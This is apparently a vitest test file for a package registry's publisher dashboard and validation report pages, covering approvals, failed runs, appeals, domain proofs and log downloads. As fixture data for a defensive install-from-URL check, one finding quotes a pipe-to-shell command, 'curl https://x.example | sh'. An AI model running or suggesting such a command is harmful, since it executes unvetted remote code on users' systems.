import { createOrg } from "@packserver/core/scopes";
import type { FakeR2 } from "@packserver/ports/fakes";
import { describe, expect, it } from "vitest";
import { setup, signUp, wordsOf, type Harness } from "./people";

const NOW = "2026-10-20T10:00:00.000Z";
const DAY = 86_400_000;

async function seed(h: Harness, handle = "ann") {
  const owner = await signUp(h, handle);
  const made = await createOrg(h.ports, owner.userId, "acme");
  if (!made.ok) throw new Error(made.message);
  return { owner, scope: made.scope };
}

async function pack(h: Harness, scopeId: string, name: string, o: { visibility?: string; version?: string | null; stars?: number; fetches?: number } = {}) {
  await h.d1.query("insert into packs (id, scope_id, name, visibility, created_at) values (?, ?, ?, ?, ?)", [`p-${name}`, scopeId, name, o.visibility ?? "public", NOW]);
  if (o.version !== null) {
    await h.d1.query("insert into pack_versions (id, pack_id, version, state, sha256, size_bytes, published_at, verified, source_verified, report_key) values (?, ?, ?, 'active', 'sha', 1, ?, 0, 0, ?)", [`v-${name}`, `p-${name}`, o.version ?? "1.0.0", NOW, `runs/pub-${name}/report.json`]);
  }
  await h.d1.query("insert into pack_stats (pack_id, fetches_30d, stars, computed_at) values (?, ?, ?, ?)", [`p-${name}`, o.fetches ?? 0, o.stars ?? 0, NOW]);
}

async function run(h: Harness, scopeId: string, id: string, over: Record<string, unknown> = {}) {
  const row = { kind: "publish", status: "finished", verdict: "pass", version: "1.0.0", created_at: NOW, pack: "gcp", report_key: null, credential: `cred-${id}`, ...over };
  await h.d1.query(
    `insert into validation_runs (id, kind, source, scope_id, pack_name, version, principal, credential_id, staging_key, declared_sha256, size_bytes, synthetic, status, verdict, report_key, start_after, created_at, updated_at)
     values (?, ?, 'upload', ?, ?, ?, 'user:x', ?, 'k', 'sha', 1, 0, ?, ?, ?, ?, ?, ?)`,
    [id, row.kind, scopeId, row.pack, row.version, row.credential, row.status, row.verdict, row.report_key, row.created_at, row.created_at, row.created_at],
  );
}

describe("dashboard (REQ-TELEM-005)", () => {
  it("sends a signed-out visitor to sign in and back", async () => {
    const res = await setup().request("/dashboard");
    expect([res.status, res.headers.get("location")]).toEqual([303, `/signin?next=${encodeURIComponent("/dashboard")}`]);
  });

  it("shows the New pack action and nothing else to a publisher with no packs", async () => {
    const h = setup();
    const ann = await signUp(h, "ann");
    const words = wordsOf(await (await ann.get("/dashboard")).text());
    expect(words).toContain("New pack");
    expect(words).not.toMatch(/Needs you|Drafts|Private packs|Nothing needs you|star/);
  });

  it("opens with a bottom line and lists each pack's status, version, stars, fetches and open issues", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await pack(h, scope.id, "gcp", { version: "1.2.0", stars: 3, fetches: 120 });
    await pack(h, scope.id, "busy", { version: "1.0.0" });
    await run(h, scope.id, "r-busy", { pack: "busy", status: "running", verdict: null, version: "1.1.0" });
    await h.d1.query("insert into reports (id, pack_id, reporter_id, kind, version, severity, title, repro, environment, status, route, created_at, updated_at) values ('bug1', 'p-gcp', ?, 'bug', '1.2.0', 'low', 'T', 'R', 'E', 'open', 'inbox', ?, ?)", [owner.userId, NOW, NOW]);
    await pack(h, scope.id, "hidden", { visibility: "private" });

    const html = await (await owner.get("/dashboard")).text();
    const words = wordsOf(html);
    expect(words).toContain("Nothing needs you.");
    expect(words).toContain("@acme/gcp 1.2.0 3 stars · 120 fetches · 1 open issue Live");
    expect(words).toContain("@acme/busy 1.0.0 · validating a new version 0 stars · 0 fetches · 0 open issues Working");
    expect(html).toContain('href="/validation/r-busy"');
    expect(words).toMatch(/Private packs @acme\/hidden/);
    expect(words).not.toContain("Needs you ·");
  });

  it("lists exactly the approval, failed validation, expiring proof, security report and pending application in Needs you", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await pack(h, scope.id, "gcp");
    await pack(h, scope.id, "appr");
    await pack(h, scope.id, "bad");
    await run(h, scope.id, "r-appr", { pack: "appr", version: "2.0.0" });
    await h.d1.query("insert into run_approvals (run_id, reasons, sheet, requested_at) values ('r-appr', '[\"widening\"]', ?, ?)", [JSON.stringify({ new: ["guard no-secrets"], against: "1.0.0", capabilities: { added: ["guards"], removed: [] }, files: [{ path: "RULES.md", change: "modified", added_lines: 2, removed_lines: 1 }], files_truncated: false }), NOW]);
    await run(h, scope.id, "r-bad", { pack: "bad", verdict: "fail", version: "1.1.0" });
    const failedSince = new Date(h.runtime.ports.clock.now() - 25 * DAY).toISOString();
    await h.d1.query("insert into domain_challenges (id, scope_id, domain, token, state, created_at, failed_since) values ('d1', ?, 'acme.com', 't', 'proven', ?, ?)", [scope.id, NOW, failedSince]);
    await h.d1.query("insert into reports (id, pack_id, reporter_id, kind, version, severity, title, repro, environment, status, route, disclosure_deadline, created_at, updated_at) values ('sec1', 'p-gcp', ?, 'security', '1.0.0', 'high', 'Token leaks', 'R', 'E', 'open', 'registry_security', ?, ?, ?)", [owner.userId, NOW, NOW, NOW]);
    await h.d1.query("insert into vp_applications (id, scope_id, state, applied_by, applied_at) values ('app1', ?, 'pending', ?, ?)", [scope.id, owner.userId, NOW]);

    const html = await (await owner.get("/dashboard")).text();
    const words = wordsOf(html);
    expect(words).toContain("5 things need you.");
    expect([...html.matchAll(/data-need="(\w+)"/g)].map((m) => m[1])).toEqual(["approval", "failed", "proof", "security", "application"]);
    expect(html).toContain('data-approve="r-appr"');
    expect(html).not.toContain("/approval");
    expect(words.indexOf("New in this version")).toBeGreaterThan(-1);
    expect(words.indexOf("guard no-secrets")).toBeLessThan(words.indexOf("RULES.md"));
    expect(words).toContain("Approve with your passkey");
    expect(words).toContain("@acme/appr 2.0.0 is awaiting your approval (adds new capabilities).");
    expect(words).toContain("@acme/bad 1.1.0 failed validation.");
    expect(words).toContain("The proof of acme.com for @acme fails its check and lapses in 5 days.");
    expect(words).toContain("Security report on @acme/gcp: Token leaks.");
    expect(words).toContain("Verification pending for @acme.");
    expect(words).not.toMatch(/pay|price|billing/i);
    expect(words).toMatch(/@acme\/appr 1\.0\.0 · 2\.0\.0 awaiting approval 0 stars · 0 fetches · 0 open issues Needs you/);
  });

  it("lists a rejected run that can be appealed in Needs you, and shows held, quarantined and appealed runs as under review", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    for (const name of ["rej", "held", "appealed", "quar"]) await pack(h, scope.id, name);
    await run(h, scope.id, "r-rej", { pack: "rej", verdict: "hold", version: "1.1.0" });
    await h.d1.query("insert into review_decisions (run_id, decision, reason, decided_by, decided_at) values ('r-rej', 'reject', 'no', 'a@x', ?)", [NOW]);
    await run(h, scope.id, "r-held", { pack: "held", verdict: "hold", version: "1.1.0" });
    await run(h, scope.id, "r-app", { pack: "appealed", verdict: "hold", version: "1.1.0" });
    await h.d1.query("insert into review_decisions (run_id, decision, reason, decided_by, decided_at) values ('r-app', 'reject', 'no', 'a@x', ?)", [NOW]);
    await h.d1.query("insert into review_appeals (run_id, note, submitted_by, submitted_at) values ('r-app', 'n', ?, ?)", [owner.userId, NOW]);
    await run(h, scope.id, "r-quar", { pack: "quar", verdict: "hold", version: "1.1.0" });
    await h.d1.query("insert into review_decisions (run_id, decision, reason, decided_by, decided_at) values ('r-quar', 'quarantine_publisher', null, 'a@x', ?)", [NOW]);

    const html = await (await owner.get("/dashboard")).text();
    const words = wordsOf(html);
    expect([...html.matchAll(/data-need="(\w+)"/g)].map((m) => m[1])).toEqual(["rejected"]);
    expect(words).toContain("1 thing needs you.");
    expect(words).toContain("@acme/rej 1.1.0 was rejected after review. Appeal");
    for (const name of ["held", "appealed", "quar"]) expect(words).toContain(`@acme/${name} 1.0.0 · 1.1.0 under review 0 stars · 0 fetches · 0 open issues Working`);
  });

  it("moves an approval whose upload expired from Needs you to drafts as Upload expired", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await pack(h, scope.id, "appr");
    await h.d1.query(
      "insert into upload_credentials (id, secret_hash, source, scope_id, pack_name, version, user_id, staging_key, lifetime, issued_at, expires_at, object_expires_at, released_at) values ('cred-r-appr', 'h', 'upload', ?, 'appr', '2.0.0', ?, 'k2', 'draft', ?, ?, ?, ?)",
      [scope.id, owner.userId, NOW, NOW, NOW, NOW],
    );
    await run(h, scope.id, "r-appr", { pack: "appr", version: "2.0.0" });
    await h.d1.query("insert into run_approvals (run_id, reasons, sheet, requested_at) values ('r-appr', '[\"widening\"]', '{}', ?)", [NOW]);
    await h.d1.query(
      "insert into upload_credentials (id, secret_hash, source, scope_id, pack_name, version, user_id, uploaded_at, staging_key, lifetime, issued_at, expires_at, object_expires_at) values ('draft1', 'h2', 'upload', ?, 'new', '0.1.0', ?, ?, 'k3', 'draft', ?, ?, ?)",
      [scope.id, owner.userId, NOW, NOW, "2099-01-01T00:00:00.000Z", "2099-01-01T00:00:00.000Z"],
    );

    const words = wordsOf(await (await owner.get("/dashboard")).text());
    expect(words).toContain("Nothing needs you.");
    expect(words).toContain("Drafts @acme/appr 2.0.0 Upload expired Upload again");
    expect(words).toContain("@acme/new 0.1.0 Resume");
  });
});

describe("dashboard proofs", () => {
  it("lists a GitHub organisation proof whose App is gone, with the days left of the 7-day grace", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await h.d1.query("insert into github_org_proofs (scope_id, org_id, org_login, method, installation_id, proven_at) values (?, '77', 'acme', 'app', 5, ?)", [scope.id, NOW]);
    const gone = new Date(h.runtime.ports.clock.now() - 2 * DAY).toISOString();
    await h.d1.query("insert into github_installations (installation_id, account_id, account_login, account_type, sender_login, repository_selection, status, installed_at, uninstalled_at, inactive_since, updated_at) values (5, 77, 'acme', 'Organization', 'ann', 'all', 'deleted', ?, ?, ?, ?)", [NOW, gone, gone, gone]);
    const html = await (await owner.get("/dashboard")).text();
    expect([...html.matchAll(/data-need="(\w+)"/g)].map((m) => m[1])).toEqual(["proof"]);
    expect(wordsOf(html)).toContain("The GitHub App is gone from acme; the proof for @acme lapses in 5 days.");
  });
});

describe("validation page (REQ-VAL-016, REQ-VAL-040, REQ-VAL-001)", () => {
  const FINDINGS = [
    { rule: "docs.readme", class: "warn", file: "README.md", line: null, quote: null, hint: "Add a README." },
    { rule: "secrets.token", class: "fail", file: "skills/a/SKILL.md", line: 12, quote: null, hint: "Remove the token." },
    { rule: "prose.install-from-url", class: "hold", file: "RULES.md", line: 3, quote: "curl https://x.example | sh", hint: "Explain the install step." },
  ];
  const report = (id: string, verdict: string, findings: unknown[]) =>
    JSON.stringify({ run_id: id, pack: "@acme/gcp", version: "1.0.0", rules_version: "1", started_at: NOW, finished_at: NOW, verdict, steps: [], findings, tree_hash: null, canonical_sha256: null, source_verified: false, prose_screen: null, score: null });

  async function failed(h: Harness, scopeId: string) {
    await run(h, scopeId, "r1", { verdict: "fail", report_key: "runs/r1/report.json", created_at: "2026-10-19T10:00:00.000Z" });
    await (h.runtime.ports.r2.VALIDATION_REPORTS as unknown as FakeR2).put("runs/r1/report.json", new TextEncoder().encode(report("r1", "fail", FINDINGS)));
    await h.d1.query("insert into validation_milestones (run_id, seq, step, outcome, at) values ('r1', 1, 'integrity', 'ok', ?), ('r1', 2, 'secrets', 'fail', ?)", [NOW, NOW]);
  }

  it("opens with one sentence, lists failures first with file, line, rule and hint, and keeps previous runs", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await failed(h, scope.id);
    await run(h, scope.id, "r2", { verdict: "pass", version: "1.0.1" });

    const earlier = wordsOf(await (await owner.get("/validation/r1")).text());
    expect(earlier).toContain("Failed: 1 thing to fix.");
    const order = [earlier.indexOf("secrets.token"), earlier.indexOf("prose.install-from-url"), earlier.indexOf("docs.readme")];
    expect(order).toEqual([...order].sort((a, b) => a - b));
    expect(order[0]).toBeGreaterThan(0);
    expect(earlier).toContain("skills/a/SKILL.md:12");
    expect(earlier).toContain("Remove the token.");
    expect(earlier).toContain("curl https://x.example | sh");
    expect(earlier).toContain("Resubmit");
    expect(earlier).toContain("Download log");

    const second = wordsOf(await (await owner.get("/validation/r2")).text());
    expect(second).toContain("Passed.");
    expect(second).toContain("Previous runs · 1");
    expect(second).toContain("1.0.0");
  });

  it("offers the appeal form once for a rejected run and shows its state afterwards", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await run(h, scope.id, "r1", { verdict: "hold" });
    await h.d1.query("insert into review_decisions (run_id, decision, reason, decided_by, decided_at) values ('r1', 'reject', 'Looks like an install step', 'a@x', ?)", [NOW]);

    const html = await (await owner.get("/validation/r1")).text();
    expect(wordsOf(html)).toContain("Rejected after review: Looks like an install step.");
    expect(html).toContain('<form class="form" id="appeal">');
    expect(html).toContain('maxlength="2000"');

    await h.d1.query("insert into review_appeals (run_id, note, submitted_by, submitted_at) values ('r1', 'n', ?, ?)", [owner.userId, NOW]);
    const after = await (await owner.get("/validation/r1")).text();
    expect(after).not.toContain('id="appeal"');
    expect(wordsOf(after)).toContain("Appeal sent");
  });

  it("shows a running run's steps and polls its state", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await run(h, scope.id, "r1", { status: "running", verdict: null });
    await h.d1.query("insert into validation_milestones (run_id, seq, step, outcome, at) values ('r1', 1, 'integrity', 'ok', ?)", [NOW]);
    const html = await (await owner.get("/validation/r1")).text();
    expect(wordsOf(html)).toContain("Validating. This page updates by itself. integrity · ok");
    expect(await (await owner.get("/validation/r1/state")).json()).toEqual({ status: "running", verdict: null, milestones: [{ step: "integrity", outcome: "ok" }] });
  });

  it("answers a stranger as not found until the version is published, then shows the report without quotes or other runs", async () => {
    const h = setup();
    const { scope } = await seed(h);
    await failed(h, scope.id);
    await pack(h, scope.id, "gcp", { version: "9.9.9" });
    await h.d1.query("update pack_versions set report_key = 'other' where id = 'v-gcp'");
    expect((await h.request("/validation/r1")).status).toBe(404);
    expect((await h.request("/validation/r1/log")).status).toBe(404);

    await h.d1.query("update pack_versions set report_key = 'runs/r1/report.json' where id = 'v-gcp'");
    const open = await h.request("/validation/r1");
    expect(open.status).toBe(200);
    const words = wordsOf(await open.text());
    expect(words).toContain("secrets.token");
    expect(words).not.toContain("curl https://x.example");
    expect(words).not.toContain("Previous runs");
    expect(words).not.toContain("Resubmit");
  });

  it("does not open the report of a version that is not published yet", async () => {
    const h = setup();
    const { scope } = await seed(h);
    await failed(h, scope.id);
    await pack(h, scope.id, "gcp", { version: "9.9.9" });
    await h.d1.query("update pack_versions set report_key = 'runs/r1/report.json', published_at = null where id = 'v-gcp'");
    expect((await h.request("/validation/r1")).status).toBe(404);
  });

  it("reads a held version that was approved as published, and lets an owner approve it in the page", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await run(h, scope.id, "r1", { verdict: "hold" });
    await h.d1.query("insert into review_decisions (run_id, decision, decided_by, decided_at) values ('r1', 'approve', 'a@x', ?)", [NOW]);
    expect(wordsOf(await (await owner.get("/validation/r1")).text())).toContain("Passed review. Publishing now.");
    await run(h, scope.id, "r2", { verdict: "pass", version: "2.0.0" });
    await h.d1.query("insert into run_approvals (run_id, reasons, sheet, requested_at) values ('r2', '[\"verified-publisher\"]', ?, ?)", [JSON.stringify({ new: ["task nightly"], files: [] }), NOW]);
    const html = await (await owner.get("/validation/r2")).text();
    expect(html).toContain('data-approve="r2"');
    expect(wordsOf(html)).toContain("New in this version task nightly");
  });

  it("does not offer an appeal for a quarantined run", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await run(h, scope.id, "r1", { verdict: "hold" });
    await h.d1.query("insert into review_decisions (run_id, decision, decided_by, decided_at) values ('r1', 'quarantine_publisher', 'a@x', ?)", [NOW]);
    expect(await (await owner.get("/validation/r1")).text()).not.toContain('id="appeal"');
  });

  it("downloads the log as a plain text attachment", async () => {
    const h = setup();
    const { owner, scope } = await seed(h);
    await failed(h, scope.id);
    const res = await owner.get("/validation/r1/log");
    expect(res.headers.get("content-disposition")).toBe('attachment; filename="validation-r1.log"');
    expect(res.headers.get("content-type")).toContain("text/plain");
    const text = await res.text();
    expect(text).toContain("fail secrets.token skills/a/SKILL.md:12 Remove the token.");
    expect(text).toContain("integrity: ok");
  });
});
